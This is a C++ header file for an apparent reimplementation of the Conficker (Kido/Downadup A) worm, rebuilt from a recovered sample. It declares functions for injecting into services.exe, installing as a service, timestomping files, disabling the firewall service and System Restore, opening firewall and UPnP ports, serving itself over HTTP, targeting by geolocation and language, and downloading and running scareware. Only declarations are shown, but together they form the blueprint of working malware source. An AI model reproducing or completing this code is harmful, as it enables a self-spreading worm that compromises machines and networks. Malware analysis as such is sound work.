/*====================================================================================
 *  KIDO worm (Conficker / Downadup A) - common declarations.
 *  Behavioural reimplementation in C++ (VS2022, x86) of the stage-3 worm recovered from
 *  kido.sample.  Function names (sub_XXXX) refer to kido_program_flow_pseudocode.txt §7.
 *====================================================================================*/
#ifndef KIDO_WORM_H
#define KIDO_WORM_H
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

#include "kido_data.h"     /* RSA modulus + exponent */
#include "kido_strings.h"   /* exact recovered literals */
#include "kido_country.h"   /* 23 country->language groups */

/* ---- crypto (crypto.cpp) ---- */
void     sha1(const void* data, size_t len, uint8_t out[20]);
void     rc4_crypt(uint8_t* buf, size_t len, const uint8_t* key, size_t keylen);
int      kido_verify_signed(const uint8_t* sig, uint8_t* body, size_t len);
uint32_t kido_crc32(const void* buf, size_t len);

/* ---- globals (kido_global.cpp) ---- */
extern HMODULE  g_hinst;          /* the loaded (wrapper) module handle */
void kido_cs_init(void);
extern char     g_path[MAX_PATH]; /* own on-disk path (the wrapper file) */
extern DWORD    g_counter;        /* persisted DWORD from ...\\Nls (default value) */
extern HANDLE   g_mutex;
extern DWORD    g_port;           /* HTTP server listening port (0 = down) */
extern SOCKET   g_listen_sock;
extern CRITICAL_SECTION g_cs_port;
extern uint8_t* g_image;          /* own file image read into memory (step 4) */
extern size_t   g_image_len;
extern size_t   g_image_overlay_off;  /* where the PE ends; bytes beyond = "overlay" */
extern HANDLE   g_file_lock;      /* keeps the own file locked */
extern uint8_t  g_lang;           /* local OS language (from ntdll.dll) */
extern int      g_geo_db_loaded;
extern uint8_t* g_geo_db;
extern size_t   g_geo_db_len;
extern char     g_geo_file[260];
extern uint8_t  g_ip_local[4];    /* a local IPv4 (for the self URL) */
extern uint8_t  g_ip_public[4];   /* public IPv4 (UPnP or HTTP lookup) */
extern char     g_token1[16];     /* random 4..8 letter token (HTTP server) */
extern char     g_token2[16];
extern HANDLE   g_evt_instance;
extern HANDLE   g_evt_worker;
extern HANDLE   g_evt_thread;

/* ---- guards (kido_guards.cpp) ---- */
int  kido_has_ukrainian_keyboard(void);            /* sub_067C0 */
void kido_init_and_guard(HMODULE hmod);            /* sub_06A3A */
int  kido_path_ends_with_dll(const char* path);    /* sub_06810 */
void kido_hotpatch_netapi(void);                   /* sub_07B0B */
void kido_read_state_dword(DWORD* out);            /* sub_07D25 */
void kido_write_state_dword(DWORD v);              /* sub_07CD4 */

/* ---- main (kido_main.cpp) ---- */
DWORD WINAPI kido_main_thread(LPVOID);             /* sub_06847 */
void kido_seed_prng(void);                         /* sub_07F51 */
DWORD kido_volume_serial(void);                    /* sub_07D84 */
void kido_read_own_image(void);                    /* sub_08119 + lock */
void kido_inject_services_exe(void);               /* sub_07CA0 */

/* ---- install (kido_install.cpp) ---- */
void kido_self_install(void);                      /* sub_06A3A step 3 */
void kido_timestomp_from_kernel32(const char* dst);/* sub_08054 */
void kido_install_service(const char* dllpath);    /* sub_0927B */
int  kido_stop_service_sharedaccess(void);         /* sub_07F99 */
void kido_reset_system_restore(void);              /* sub_08F2C */
char* kido_random_lowercase(int len);              /* sub_07FF2 (returns static buf) */

/* ---- http (kido_http.cpp) ---- */
int   kido_http_server_start(void);                /* sub_0C334 */
int   kido_http_get(const char* url, uint8_t** out, size_t* outlen); /* sub_08471 */
int   kido_http_reachable(const char* url);        /* sub_085C8 */
void  kido_open_firewall_port(DWORD port);         /* sub_06D4E */

/* ---- net (kido_net.cpp) ---- */
DWORD WINAPI kido_network_worker(LPVOID);          /* sub_08A08 */
void kido_public_ip_lookup(void);                  /* sub_0728D */
int  kido_upnp_add_port_mapping(DWORD port);       /* sub_07077 chain */
void kido_enum_local_addresses(void);              /* sub_07E5C */

/* ---- geo (kido_geo.cpp) ---- */
void kido_geo_database_setup(void);                /* sub_0C843 */
int  kido_os_language_from_ntdll(void);            /* sub_0C5AF */
int  kido_target_language(const uint8_t ip[4]);    /* sub_0C747 */
int  kido_is_private_ip(const uint8_t ip[4]);      /* sub_07DCA */
const char* kido_geoip_country(const uint8_t ip[4]);/* sub_0CEB4 */

/* ---- downloader (kido_downloader.cpp) ---- */
DWORD WINAPI kido_scareware_downloader(LPVOID);    /* sub_0986A */
DWORD WINAPI kido_rendezvous_round(LPVOID);        /* sub_0991B */
int  kido_download_and_run(const char* url);       /* sub_09427 */
void kido_fetch_web_date(void);                    /* sub_0961F */

#endif /* KIDO_WORM_H */
